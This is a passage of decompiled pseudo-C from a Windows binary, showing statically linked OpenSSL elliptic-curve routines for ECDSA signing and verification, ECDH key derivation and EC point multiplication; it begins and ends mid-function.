      v26 = 0;
      v47 = 1;
      v27 = 0;
      v45 = 0;
      v46 = 0;
      v28 = (int *)sub_416820();
      if ( !sub_416E50(a1, v40, v28, (int)Block, a8) )
        goto LABEL_89;
      v36 = v42 - 1;
      if ( v42 - 1 < 0 )
      {
LABEL_87:
        if ( !sub_428540(a2, v40, (int)Block, v13) )
          goto LABEL_89;
        goto LABEL_88;
      }
      v29 = v42 - 2;
      v39 = v41 - v38;
      v43 = 2 - v41;
      while ( v47 || sub_428890(a1, v40, (int *)v40, (int)v40, (int)Block, v13) )
      {
        if ( !v26 && sub_416A50(a4, v36) )
        {
          for ( i = v39 + v43 + v29; !sub_416A50(a4, i); ++i )
            ;
          v31 = v29 < i;
          v45 = i;
          v26 = 1;
          v32 = v29;
          if ( !v31 )
          {
            do
            {
              v26 *= 2;
              if ( sub_416A50(a4, v32) )
                ++v26;
              --v32;
            }
            while ( v32 >= v45 );
          }
        }
        if ( !v27 && sub_416A50(a6, v36) )
        {
          for ( j = v43 + v29; !sub_416A50(a6, j); ++j )
            ;
          v31 = v29 < j;
          v46 = j;
          v27 = 1;
          v34 = v29;
          if ( !v31 )
          {
            do
            {
              v27 *= 2;
              if ( sub_416A50(a6, v34) )
                ++v27;
              --v34;
            }
            while ( v34 >= v46 );
          }
        }
        if ( v26 && v36 == v45 )
        {
          if ( !sub_428890(a1, v40, (int *)v40, v49[v26 >> 1], (int)Block, a8) )
            break;
          v26 = 0;
          v47 = 0;
        }
        if ( v27 && v36 == v46 )
        {
          if ( !sub_428890(a1, v40, (int *)v40, v48[v27 >> 1], (int)Block, a8) )
            break;
          v27 = 0;
          v47 = 0;
        }
        v13 = a8;
        --v29;
        if ( --v36 < 0 )
          goto LABEL_87;
      }
    }
    else
    {
      while ( 1 )
      {
        v25 = sub_420790(a8);
        v48[v24] = (int)v25;
        if ( !v25 || !sub_428890(a1, v25, (int *)v48[v24 - 1], (int)v35, (int)Block, a8) )
          break;
        if ( ++v24 >= v23 )
          goto LABEL_57;
      }
    }
  }
  else
  {
    while ( 1 )
    {
      v20 = sub_420790(a8);
      v49[v19] = (int)v20;
      if ( !v20 || !sub_428890(a1, v20, (int *)v48[v19 + 31], (int)v35, (int)Block, a8) )
        break;
      if ( ++v19 >= v18 )
        goto LABEL_43;
    }
  }
LABEL_89:
  v13 = a8;
  if ( !a9 )
LABEL_90:
    sub_4285A0(Block);
  sub_420750(v13);
  return v44;
}
// 456090: using guessed type int var_80[32];

//----- (00456690) --------------------------------------------------------
int __cdecl sub_456690(int a1, int a2, int a3, void *a4, signed int *a5, int a6, int a7, int a8)
{
  int v8; // eax
  _DWORD **v9; // esi
  signed int v11; // eax

  sub_406F30();
  v8 = sub_47FD80(a2, a3, a6, a7, a8);
  v9 = (_DWORD **)v8;
  if ( v8 )
  {
    v11 = sub_420140(v8, &a4);
    *a5 = v11;
    sub_4201A0(v9);
    return 1;
  }
  else
  {
    *a5 = 0;
    return 0;
  }
}

//----- (004566F0) --------------------------------------------------------
int __usercall sub_4566F0@<eax>(__m64 a1@<mm0>, int a2, int *a3, unsigned int **a4, _DWORD **a5, void *a6, size_t Size)
{
  int v7; // ebp
  int *v8; // ebx
  int *v10; // edi
  unsigned int *v11; // esi
  _DWORD *v12; // eax
  int *v13; // ebx
  int v14; // eax
  int v15; // ebp
  int v16; // eax
  void *v17; // eax
  _DWORD *v18; // [esp+Ch] [ebp-14h]
  _DWORD *v19; // [esp+10h] [ebp-10h]
  _DWORD *Block; // [esp+14h] [ebp-Ch]
  int v21; // [esp+18h] [ebp-8h]
  int *v22; // [esp+1Ch] [ebp-4h]

  v7 = a2;
  Block = 0;
  v21 = 0;
  if ( !a2 || (v8 = (int *)sub_407400(a2), (v22 = v8) == 0) )
  {
    sub_408310(16, 248, 67, (int)"crypto\\ec\\ecdsa_ossl.c", 46);
    return 0;
  }
  if ( !sub_41E860(a2) )
  {
    sub_408310(16, 248, 159, (int)"crypto\\ec\\ecdsa_ossl.c", 51);
    return 0;
  }
  v10 = a3;
  if ( !a3 )
  {
    v10 = sub_420670();
    if ( !v10 )
    {
      sub_408310(16, 248, 65, (int)"crypto\\ec\\ecdsa_ossl.c", 57);
      return 0;
    }
  }
  v11 = sub_4168C0();
  v19 = sub_4168C0();
  v12 = sub_4168C0();
  v18 = v12;
  if ( !v11 || !v19 || !v12 )
  {
    sub_408310(16, 248, 65, (int)"crypto\\ec\\ecdsa_ossl.c", 67);
    goto LABEL_47;
  }
  Block = sub_435F90(v8);
  if ( !Block )
  {
    sub_408310(16, 248, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 71);
LABEL_47:
    sub_417000(v11);
    sub_417000(v19);
    goto LABEL_48;
  }
  v13 = (int *)sub_432B60((int)v8);
  if ( !v13 )
  {
    sub_408310(16, 248, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 76);
    goto LABEL_47;
  }
  while ( 1 )
  {
    do
    {
      if ( a6 )
      {
        v14 = sub_457690(v7);
        if ( !sub_42A9B0(v11, v13, v14, a6, Size, v10) )
        {
          sub_408310(16, 248, 158, (int)"crypto\\ec\\ecdsa_ossl.c", 88);
          goto LABEL_47;
        }
      }
      else if ( !sub_42A970(v11, v13) )
      {
        sub_408310(16, 248, 158, (int)"crypto\\ec\\ecdsa_ossl.c", 94);
        goto LABEL_47;
      }
    }
    while ( sub_416DB0((int)v11) );
    if ( !sub_4220E0(v11, (int)v11, (int)v13) )
      goto LABEL_47;
    v15 = sub_416F90(v13);
    if ( sub_416F90(v11) <= v15 && !sub_4220E0(v11, (int)v11, (int)v13) )
      goto LABEL_47;
    if ( !sub_436650(v22, Block, v11, 0, 0, (int)v10) )
    {
      sub_408310(16, 248, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 113);
      goto LABEL_47;
    }
    v16 = sub_435D30((int)v22);
    if ( sub_422350(v16) == 406 )
    {
      if ( !sub_4361F0((int)v22, Block, (int)v18, 0, (int)v10) )
      {
        sub_408310(16, 248, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 120);
        goto LABEL_47;
      }
    }
    else if ( !sub_436260((int)v22, Block, (int)v18, 0, (int)v10) )
    {
      sub_408310(16, 248, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 130);
      goto LABEL_47;
    }
    if ( !sub_42A2D0(v19, v18, v13, v10) )
    {
      sub_408310(16, 248, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 136);
      goto LABEL_47;
    }
    if ( !sub_416DB0((int)v19) )
      break;
    v7 = a2;
  }
  if ( sub_407470((int)v22) )
  {
    if ( !sub_417490(v18, 2) )
    {
      sub_408310(16, 248, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 149);
      goto LABEL_47;
    }
    if ( !sub_42A3B0(v18, (int)v13, (int)v18, v13, v10) )
    {
      sub_408310(16, 248, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 153);
      goto LABEL_47;
    }
    sub_416F20((int)v18, 4);
    v17 = (void *)sub_407470((int)v22);
    if ( !sub_427520(a1, v11, v11, v18, (int)v13, v10, v17) )
    {
      sub_408310(16, 248, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 159);
      goto LABEL_47;
    }
  }
  else if ( !sub_4211F0((void **)v11, v11, v13, v10) )
  {
    sub_408310(16, 248, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 164);
    goto LABEL_47;
  }
  sub_417000(*a5);
  sub_417000(*a4);
  *a5 = v19;
  *a4 = v11;
  v21 = 1;
LABEL_48:
  if ( v10 != a3 )
    sub_4206C0((void **)v10);
  sub_436040(Block);
  sub_417000(v18);
  return v21;
}

//----- (00456AD0) --------------------------------------------------------
int __usercall sub_456AD0@<eax>(__m64 a1@<mm0>, int a2, int *a3, unsigned int **a4, _DWORD **a5)
{
  return sub_4566F0(a1, a2, a3, a4, a5, 0, 0);
}

//----- (00456B00) --------------------------------------------------------
_DWORD **__usercall sub_456B00@<eax>(__m64 a1@<mm0>, _BYTE *a2, int Size, unsigned int **a4, _DWORD *a5, int a6)
{
  int *v6; // ebp
  int v7; // esi
  int *v8; // eax
  _DWORD **v9; // edi
  int *v10; // eax
  int *v11; // eax
  int *v12; // ebx
  int v13; // esi
  unsigned int **v14; // esi
  int *v15; // esi
  unsigned int **v17; // [esp-Ch] [ebp-30h]
  int v18; // [esp-4h] [ebp-28h]
  unsigned int **Block; // [esp+10h] [ebp-14h]
  _DWORD *v20; // [esp+14h] [ebp-10h]
  void *v21; // [esp+18h] [ebp-Ch] BYREF
  int *v22; // [esp+1Ch] [ebp-8h]
  int *v23; // [esp+20h] [ebp-4h]

  v21 = 0;
  Block = 0;
  v20 = 0;
  v6 = 0;
  v7 = sub_407400(a6);
  v8 = (int *)sub_457690(a6);
  v23 = v8;
  if ( !v7 || !v8 )
  {
    sub_408310(16, 249, 67, (int)"crypto\\ec\\ecdsa_ossl.c", 210);
    return 0;
  }
  if ( !sub_41E860(a6) )
  {
    sub_408310(16, 249, 159, (int)"crypto\\ec\\ecdsa_ossl.c", 215);
    return 0;
  }
  v9 = (_DWORD **)sub_420160();
  if ( !v9 )
  {
    sub_408310(16, 249, 65, (int)"crypto\\ec\\ecdsa_ossl.c", 221);
    return 0;
  }
  *v9 = sub_4168C0();
  v10 = sub_4168C0();
  v22 = v10;
  v9[1] = v10;
  if ( *v9 && v10 )
  {
    v6 = sub_420670();
    if ( v6 )
    {
      v20 = sub_4168C0();
      if ( v20 )
      {
        Block = (unsigned int **)sub_4168C0();
        if ( Block )
        {
          v11 = (int *)sub_432B60(v7);
          v12 = v11;
          if ( v11 )
          {
            v13 = sub_416F90(v11);
            if ( 8 * Size > v13 )
              Size = (v13 + 7) / 8;
            if ( sub_4174D0(a2, Size, (int)Block) )
            {
              if ( 8 * Size <= v13 || sub_437D40(Block, Block, 8 - (v13 & 7)) )
              {
                while ( 1 )
                {
                  v14 = a4;
                  if ( a4 && a5 )
                  {
                    if ( !sub_4173E0(*v9, a5) )
                    {
                      v18 = 268;
                      goto LABEL_40;
                    }
                  }
                  else
                  {
                    if ( !sub_4566F0(a1, a6, v6, (unsigned int **)&v21, v9, a2, Size) )
                    {
                      sub_408310(16, 249, 42, (int)"crypto\\ec\\ecdsa_ossl.c", 261);
                      goto LABEL_41;
                    }
                    v14 = (unsigned int **)v21;
                  }
                  if ( !sub_42A430(v20, v23, (unsigned int **)*v9, v12, v6) )
                  {
                    sub_408310(16, 249, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 274);
                    goto LABEL_41;
                  }
                  if ( !sub_42A360(v22, (int)v20, (int)Block, v12) )
                  {
                    sub_408310(16, 249, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 278);
                    goto LABEL_41;
                  }
                  v17 = v14;
                  v15 = v22;
                  if ( !sub_42A430(v22, v22, v17, v12, v6) )
                    break;
                  if ( !sub_416DB0((int)v15) )
                    goto LABEL_42;
                  if ( a4 && a5 )
                  {
                    sub_408310(16, 249, 157, (int)"crypto\\ec\\ecdsa_ossl.c", 291);
                    goto LABEL_41;
                  }
                }
                sub_408310(16, 249, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 282);
              }
              else
              {
                sub_408310(16, 249, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 255);
              }
            }
            else
            {
              sub_408310(16, 249, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 250);
            }
          }
          else
          {
            sub_408310(16, 249, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 240);
          }
          goto LABEL_41;
        }
      }
    }
    v18 = 234;
  }
  else
  {
    v18 = 227;
  }
LABEL_40:
  sub_408310(16, 249, 65, (int)"crypto\\ec\\ecdsa_ossl.c", v18);
LABEL_41:
  sub_4201A0(v9);
  v9 = 0;
LABEL_42:
  sub_4206C0((void **)v6);
  sub_417000(Block);
  sub_417000(v20);
  sub_417000(v21);
  return v9;
}

//----- (00456E30) --------------------------------------------------------
int __cdecl sub_456E30(int a1, int a2, int a3, _BYTE *a4, int a5, int a6)
{
  _BYTE *v6; // esi
  int v7; // edi
  int v8; // ebp
  int v10; // ebx
  unsigned int v11; // eax
  _BYTE *v12; // ecx
  void *Block; // [esp+Ch] [ebp-8h] BYREF
  void *v14; // [esp+10h] [ebp-4h] BYREF

  v6 = a4;
  v7 = -1;
  v14 = a4;
  Block = 0;
  v8 = -1;
  a4 = sub_420160();
  if ( !a4 )
    return -1;
  v10 = a5;
  if ( sub_420120((int *)&a4, &v14, a5) )
  {
    v11 = sub_420140((int)a4, &Block);
    v7 = v11;
    if ( v11 == v10 )
    {
      v12 = Block;
      if ( v11 < 4 )
      {
LABEL_8:
        if ( !v11 || *v12 == *v6 && (v11 <= 1 || v12[1] == v6[1] && (v11 <= 2 || v12[2] == v6[2])) )
          v8 = sub_47FE10(a2, a3, (int)a4, a6);
      }
      else
      {
        while ( *(_DWORD *)v6 == *(_DWORD *)v12 )
        {
          v11 -= 4;
          v12 += 4;
          v6 += 4;
          if ( v11 < 4 )
            goto LABEL_8;
        }
      }
    }
  }
  sub_4134B0(Block, v7);
  sub_4201A0((_DWORD **)a4);
  return v8;
}

//----- (00456F30) --------------------------------------------------------
int __cdecl sub_456F30(_BYTE *a1, int a2, int *a3, FILE *Stream)
{
  int v4; // edi
  int *v5; // eax
  int *v6; // esi
  unsigned int **v7; // ebp
  int *v8; // edi
  int v9; // eax
  int v10; // ebx
  int v11; // edi
  int v12; // edx
  int *v13; // edi
  _DWORD *v14; // edi
  int v15; // eax
  _DWORD *v17; // [esp+Ch] [ebp-1Ch]
  int v18; // [esp+10h] [ebp-18h]
  _DWORD *v19; // [esp+14h] [ebp-14h]
  int *v20; // [esp+18h] [ebp-10h]
  void *Block; // [esp+1Ch] [ebp-Ch]
  int *v22; // [esp+20h] [ebp-8h]
  int v23; // [esp+24h] [ebp-4h]
  unsigned int **Streama; // [esp+38h] [ebp+10h]

  v18 = -1;
  Block = 0;
  if ( !Stream || (v4 = sub_407400((int)Stream), (v22 = (int *)v4) == 0) || (v23 = _fileno(Stream)) == 0 || !a3 )
  {
    sub_408310(16, 250, 124, (int)"crypto\\ec\\ecdsa_ossl.c", 358);
    return -1;
  }
  if ( sub_41E860((int)Stream) )
  {
    v5 = sub_420670();
    v6 = v5;
    if ( !v5 )
    {
      sub_408310(16, 250, 65, (int)"crypto\\ec\\ecdsa_ossl.c", 369);
      return -1;
    }
    sub_420700(v5);
    v19 = sub_420790(v6);
    v7 = (unsigned int **)sub_420790(v6);
    Streama = (unsigned int **)sub_420790(v6);
    v17 = sub_420790(v6);
    if ( !v17 )
    {
      sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 378);
      goto LABEL_47;
    }
    v8 = (int *)sub_432B60(v4);
    v20 = v8;
    if ( v8 )
    {
      if ( sub_416DB0(*a3)
        || sub_416E40(*a3)
        || sub_416960((_DWORD *)*a3, v8) >= 0
        || sub_416DB0(a3[1])
        || sub_416E40(a3[1])
        || sub_416960((_DWORD *)a3[1], v8) >= 0 )
      {
        sub_408310(16, 250, 156, (int)"crypto\\ec\\ecdsa_ossl.c", 391);
        v18 = 0;
        goto LABEL_47;
      }
      if ( sub_4211F0((void **)v7, (_DWORD *)a3[1], v8, v6) )
      {
        v9 = sub_416F90(v8);
        v10 = a2;
        v11 = v9;
        if ( 8 * a2 > v9 )
          v10 = (v9 + 7) / 8;
        if ( sub_4174D0(a1, v10, (int)Streama) )
        {
          if ( 8 * v10 <= v11 )
          {
            v13 = (int *)Streama;
          }
          else
          {
            v12 = 8 - (v11 & 7);
            v13 = (int *)Streama;
            if ( !sub_437D40(Streama, Streama, v12) )
            {
              sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 413);
              goto LABEL_47;
            }
          }
          if ( sub_42A430(v19, v13, v7, v20, v6) )
          {
            if ( sub_42A430(v7, (int *)*a3, v7, v20, v6) )
            {
              v14 = sub_435F90(v22);
              Block = v14;
              if ( v14 )
              {
                if ( sub_436650(v22, v14, v19, v23, (int)v7, (int)v6) )
                {
                  v15 = sub_435D30((int)v22);
                  if ( sub_422350(v15) == 406 )
                  {
                    if ( !sub_4361F0((int)v22, v14, (int)v17, 0, (int)v6) )
                    {
                      sub_408310(16, 250, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 438);
                      goto LABEL_47;
                    }
                  }
                  else if ( !sub_436260((int)v22, v14, (int)v17, 0, (int)v6) )
                  {
                    sub_408310(16, 250, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 446);
                    goto LABEL_47;
                  }
                  if ( sub_42A2D0(v19, v17, v20, v6) )
                    v18 = sub_416960(v19, (int *)*a3) == 0;
                  else
                    sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 452);
                  goto LABEL_47;
                }
                sub_408310(16, 250, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 432);
              }
              else
              {
                sub_408310(16, 250, 65, (int)"crypto\\ec\\ecdsa_ossl.c", 428);
              }
            }
            else
            {
              sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 423);
            }
          }
          else
          {
            sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 418);
          }
        }
        else
        {
          sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 408);
        }
      }
      else
      {
        sub_408310(16, 250, 3, (int)"crypto\\ec\\ecdsa_ossl.c", 397);
      }
    }
    else
    {
      sub_408310(16, 250, 16, (int)"crypto\\ec\\ecdsa_ossl.c", 384);
    }
LABEL_47:
    sub_420750(v6);
    sub_4206C0((void **)v6);
    sub_436040(Block);
    return v18;
  }
  sub_408310(16, 250, 159, (int)"crypto\\ec\\ecdsa_ossl.c", 363);
  return -1;
}

//----- (00457340) --------------------------------------------------------
int __cdecl sub_457340(int a1, int a2, int a3, int a4)
{
  int (*v4)(void); // eax

  v4 = *(int (**)(void))(**(_DWORD **)(a4 + 12) + 192);
  if ( v4 )
    return v4();
  sub_408310(16, 247, 160, (int)"crypto\\ec\\ecdh_ossl.c", 40);
  return 0;
}

//----- (00457380) --------------------------------------------------------
int __cdecl sub_457380(char **a1, unsigned int *a2, int a3, int a4)
{
  int *v4; // eax
  int *v5; // esi
  unsigned int **v6; // ebx
  unsigned int **v7; // ebp
  int *v8; // edi
  _DWORD *v9; // eax
  _DWORD *v10; // ebp
  int v11; // eax
  unsigned int v12; // edi
  unsigned int v13; // ebp
  char *v14; // eax
  char *Block; // [esp+8h] [ebp-14h]
  int v17; // [esp+Ch] [ebp-10h]
  _DWORD *v18; // [esp+10h] [ebp-Ch]
  void *v19; // [esp+14h] [ebp-8h]
  int v20; // [esp+18h] [ebp-4h]

  v19 = 0;
  v20 = 0;
  Block = 0;
  v4 = sub_420670();
  v5 = v4;
  if ( v4 )
  {
    sub_420700(v4);
    v6 = (unsigned int **)sub_420790(v5);
    v18 = sub_420790(v5);
    v7 = (unsigned int **)sub_457690(a4);
    v17 = (int)v7;
    if ( !v7 )
    {
      sub_408310(16, 257, 154, (int)"crypto\\ec\\ecdh_ossl.c", 72);
      goto LABEL_27;
    }
    v8 = (int *)sub_407400(a4);
    if ( (sub_44CEB0(a4) & 0x1000) != 0 )
    {
      if ( !sub_435D80((int)v8, v6) || !sub_421C20(v6, v6, v7, v5) )
      {
        sub_408310(16, 257, 65, (int)"crypto\\ec\\ecdh_ossl.c", 81);
        goto LABEL_27;
      }
      v17 = (int)v6;
    }
    v9 = sub_435F90(v8);
    v10 = v9;
    v19 = v9;
    if ( !v9 )
    {
      sub_408310(16, 257, 65, (int)"crypto\\ec\\ecdh_ossl.c", 88);
      goto LABEL_27;
    }
    if ( !sub_436650(v8, v9, 0, a3, v17, (int)v5) )
    {
      sub_408310(16, 257, 155, (int)"crypto\\ec\\ecdh_ossl.c", 93);
      goto LABEL_27;
    }
    v11 = sub_435D30((int)v8);
    if ( sub_422350(v11) == 406 )
    {
      if ( !sub_4361F0((int)v8, v10, (int)v6, (int)v18, (int)v5) )
      {
        sub_408310(16, 257, 155, (int)"crypto\\ec\\ecdh_ossl.c", 100);
        goto LABEL_27;
      }
    }
    else if ( !sub_436260((int)v8, v10, (int)v6, (int)v18, (int)v5) )
    {
      sub_408310(16, 257, 155, (int)"crypto\\ec\\ecdh_ossl.c", 107);
      goto LABEL_27;
    }
    v12 = (sub_435F50((int)v8) + 7) / 8;
    v13 = (sub_416F90(v6) + 7) / 8;
    if ( v13 <= v12 )
    {
      v14 = (char *)sub_4133F0(v12);
      Block = v14;
      if ( v14 )
      {
        memset(v14, 0, v12 - v13);
        if ( v13 == sub_417300(v6, &Block[v12 - v13]) )
        {
          *a1 = Block;
          *a2 = v12;
          Block = 0;
          v20 = 1;
        }
        else
        {
          sub_408310(16, 257, 3, (int)"crypto\\ec\\ecdh_ossl.c", 126);
        }
      }
      else
      {
        sub_408310(16, 257, 65, (int)"crypto\\ec\\ecdh_ossl.c", 120);
      }
    }
    else
    {
      sub_408310(16, 257, 68, (int)"crypto\\ec\\ecdh_ossl.c", 116);
    }
  }
LABEL_27:
  sub_436040(v19);
  if ( v5 )
    sub_420750(v5);
  sub_4206C0((void **)v5);
  sub_413490(Block);
  return v20;
}

//----- (00457610) --------------------------------------------------------
int sub_457610()
{
  return sub_42AE00((LPCRITICAL_SECTION)&stru_539288.LockCount);
}

//----- (00457620) --------------------------------------------------------
int __cdecl sub_457620(_DWORD *a1)
{
  if ( a1[5] )
    return sub_42AC30(&stru_539288.LockCount, (int)sub_457610, a1, &dword_50F3D0, 1, 0);
  else
    return 1;
}
// 50F3D0: using guessed type int dword_50F3D0;

//----- (00457650) --------------------------------------------------------
int __cdecl sub_457650(_DWORD *a1)
{
  if ( a1[5] )
    return sub_42AC30(&stru_539288.LockCount, (int)sub_457610, a1, &dword_50F3D0, 1, 1);
  else
    return 1;
}
// 50F3D0: using guessed type int dword_50F3D0;

//----- (00457680) --------------------------------------------------------
_DWORD *sub_457680()
{
  return sub_42AE50(&stru_539288.LockCount, 1);
}

//----- (00457690) --------------------------------------------------------
int __cdecl sub_457690(int a1)
{
  return *(_DWORD *)(a1 + 20);
}

//----- (004576A0) --------------------------------------------------------
_DWORD *__usercall sub_4576A0@<eax>(int a1@<edi>)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax

  if ( !a1 )
    return 0;
  v2 = sub_413430(0x20u);
  v3 = v2;
  if ( v2 )
  {
    *v2 = a1;
    v2[1] = 8;
    v2[3] = 4;
    v2[6] = 1;
    v4 = sub_414650();
    v3[7] = v4;
    if ( v4 )
    {
      return v3;
    }
    else
    {
      sub_408310(16, 196, 65, (int)"crypto\\ec\\ec_mult.c", 65);
      sub_413490(v3);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 196, 65, (int)"crypto\\ec\\ec_mult.c", 54);
    return 0;
  }
}

//----- (00457730) --------------------------------------------------------
int __cdecl sub_457730(int a1)
{
  int v1; // esi

  v1 = a1;
  if ( a1 )
    sub_4147E0((volatile LONG *)(a1 + 24), 1, &a1);
  return v1;
}

//----- (00457760) --------------------------------------------------------
void __cdecl sub_457760(volatile LONG *Block)
{
  volatile LONG *v1; // edi
  int v2; // esi
  void *v3; // eax

  v1 = Block;
  if ( Block )
  {
    sub_4147E0(Block + 6, -1, &Block);
    if ( (int)Block <= 0 )
    {
      v2 = *((_DWORD *)v1 + 4);
      if ( v2 )
      {
        v3 = *(void **)v2;
        if ( *(_DWORD *)v2 )
        {
          do
          {
            sub_436040(v3);
            v3 = *(void **)(v2 + 4);
            v2 += 4;
          }
          while ( v3 );
        }
        sub_413490(*((void **)v1 + 4));
      }
      sub_4146D0(*((LPCRITICAL_SECTION *)v1 + 7));
      sub_413490((void *)v1);
    }
  }
}

//----- (004577E0) --------------------------------------------------------
int __cdecl sub_4577E0(int *a1, _DWORD *a2, _DWORD *a3, unsigned int a4, int a5, int a6, int a7)
{
  unsigned int v7; // ebp
  int v8; // eax
  unsigned int v10; // ebx
  int v11; // ecx
  _DWORD *v12; // edi
  _DWORD *v13; // eax
  unsigned int v14; // esi
  unsigned int v15; // esi
  unsigned int v16; // eax
  unsigned int v17; // esi
  int v18; // eax
  size_t v19; // esi
  void **v20; // edi
  int *v21; // esi
  int v22; // edi
  int v23; // ebp
  unsigned int v24; // eax
  int v25; // eax
  _DWORD *v26; // eax
  unsigned int *v27; // edi
  char *v28; // eax
  unsigned int v29; // edi
  char *v30; // esi
  unsigned int v31; // ecx
  unsigned int v32; // eax
  _DWORD *v33; // edi
  size_t *v34; // esi
  int v35; // ebp
  void *v36; // eax
  int v37; // ecx
  _DWORD *v38; // edi
  _DWORD *v39; // eax
  unsigned int v40; // ebp
  _BYTE *v41; // esi
  int v42; // eax
  unsigned int v43; // ebx
  _DWORD *v44; // eax
  unsigned int v45; // ebp
  _DWORD ***v46; // esi
  int v47; // edi
  int v48; // ebx
  _DWORD *v49; // ecx
  int v50; // edi
  unsigned int v51; // ebx
  int v52; // esi
  _DWORD *v53; // edi
  int v54; // eax
  int *v55; // eax
  int v56; // eax
  int v57; // esi
  int v58; // eax
  int v59; // esi
  int v60; // eax
  void *v61; // eax
  void **i; // esi
  void *v63; // edi
  _BYTE *v64; // eax
  _DWORD *v65; // esi
  int v66; // [esp-10h] [ebp-70h]
  int v67; // [esp-Ch] [ebp-6Ch]
  void *v68; // [esp+8h] [ebp-58h]
  int v69; // [esp+Ch] [ebp-54h]
  char *Src; // [esp+10h] [ebp-50h]
  char *Srca; // [esp+10h] [ebp-50h]
  char *Srcb; // [esp+10h] [ebp-50h]
  unsigned int v73; // [esp+14h] [ebp-4Ch]
  void *v74; // [esp+18h] [ebp-48h]
  char *v75; // [esp+1Ch] [ebp-44h]
  unsigned int v76; // [esp+20h] [ebp-40h]
  void **v77; // [esp+24h] [ebp-3Ch]
  unsigned int v78; // [esp+28h] [ebp-38h]
  unsigned int v79; // [esp+2Ch] [ebp-34h]
  unsigned int v80; // [esp+30h] [ebp-30h]
  int Block; // [esp+34h] [ebp-2Ch]
  char *Blocka; // [esp+34h] [ebp-2Ch]
  int Blockb; // [esp+34h] [ebp-2Ch]
  unsigned int v84; // [esp+38h] [ebp-28h] BYREF
  int v85; // [esp+3Ch] [ebp-24h]
  void *v86; // [esp+40h] [ebp-20h]
  void *v87; // [esp+44h] [ebp-1Ch]
  int v88; // [esp+48h] [ebp-18h]
  _DWORD **v89; // [esp+4Ch] [ebp-14h]
  void *v90; // [esp+50h] [ebp-10h]
  int v91; // [esp+54h] [ebp-Ch]
  _DWORD *v92; // [esp+58h] [ebp-8h]
  int j; // [esp+5Ch] [ebp-4h]

  v7 = 0;
  v8 = *a1;
  v90 = 0;
  v89 = 0;
  v86 = 0;
  v78 = 0;
  v69 = 0;
  v88 = 0;
  v85 = 0;
  v74 = 0;
  v77 = 0;
  v75 = 0;
  v76 = 0;
  v87 = 0;
  v68 = 0;
  v84 = 0;
  Block = 0;
  v91 = 0;
  if ( v8 != *a2 )
  {
    sub_408310(16, 187, 101, (int)"crypto\\ec\\ec_mult.c", 155);
    return 0;
  }
  v10 = a4;
  if ( !a3 && !a4 )
    return sub_436120((int)a1, a2);
  v11 = 0;
  if ( !a4 )
  {
LABEL_9:
    v12 = (_DWORD *)a7;
    if ( !a7 )
    {
      v12 = sub_420670();
      v90 = v12;
      a7 = (int)v12;
      if ( !v12 )
        goto LABEL_139;
    }
    if ( a3 )
    {
      v13 = (_DWORD *)sub_422350((int)a1);
      v89 = (_DWORD **)v13;
      if ( !v13 )
      {
        sub_408310(16, 187, 113, (int)"crypto\\ec\\ec_mult.c", 179);
LABEL_139:
        sub_4206C0((void **)v90);
        sub_436040(v86);
        sub_413490(v74);
        sub_413490(v75);
        if ( v77 )
        {
          v61 = *v77;
          for ( i = v77; v61; ++i )
          {
            sub_413490(v61);
            v61 = i[1];
          }
          sub_413490(v77);
        }
        v63 = v87;
        if ( v87 )
        {
          v64 = *(_BYTE **)v87;
          v65 = v87;
          if ( *(_DWORD *)v87 )
          {
            do
            {
              sub_436070(v64);
              v64 = (_BYTE *)v65[1];
              ++v65;
            }
            while ( v64 );
          }
          sub_413490(v63);
        }
        sub_413490(v68);
        return v91;
      }
      v7 = a1[24];
      v84 = v7;
      if ( v7 && *(_DWORD *)(v7 + 8) && !sub_4364F0((int)a1, v13, **(_DWORD ***)(v7 + 16), (int)v12) )
      {
        v14 = *(_DWORD *)(v7 + 4);
        v78 = v14;
        v15 = sub_416F90(a3) / v14;
        v16 = *(_DWORD *)(v7 + 8);
        v17 = v15 + 1;
        v69 = v17;
        if ( v17 > v16 )
        {
          v17 = *(_DWORD *)(v7 + 8);
          v69 = v17;
        }
        v18 = (1 << (*(_BYTE *)(v7 + 12) - 1)) * v16;
        v88 = 1 << (*(_BYTE *)(v7 + 12) - 1);
        if ( *(_DWORD *)(v7 + 20) != v18 )
        {
          sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 207);
          goto LABEL_139;
        }
      }
      else
      {
        v7 = 0;
        v84 = 0;
        v69 = 1;
        Block = 1;
        v17 = 1;
      }
    }
    else
    {
      v17 = 0;
    }
    v73 = a4 + v17;
    v19 = 4 * (a4 + v17);
    v74 = sub_4133F0(v19);
    v75 = (char *)sub_4133F0(v19);
    v20 = (void **)sub_4133F0(v19 + 4);
    v77 = v20;
    v68 = sub_4133F0(v19);
    if ( v20 )
      *v20 = 0;
    if ( v74 && v75 && v20 && v68 )
    {
      v80 = 0;
      Src = 0;
      v79 = Block + a4;
      if ( Block + a4 )
      {
        v21 = (int *)v74;
        v22 = a6 - (_DWORD)v74;
        v23 = (char *)v77 - (_BYTE *)v74;
        v92 = (_DWORD *)(a6 - (_DWORD)v74);
